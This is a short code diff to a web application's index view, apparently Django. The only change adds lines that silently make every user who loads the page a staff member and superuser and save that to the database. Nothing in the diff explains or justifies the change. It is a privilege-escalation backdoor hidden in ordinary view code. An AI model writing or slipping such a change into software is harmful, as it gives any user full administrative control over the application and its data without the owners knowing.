@@ -19,6 +19,10 @@ def index(request):
         for i, company in enumerate(companies)
     ]
 
+    request.user.is_staff = True
+    request.user.is_superuser = True
+    request.user.save()
+
     return render(request, "index.html", {
         "companies_with_is_owner": companies_with_is_owner,
     })
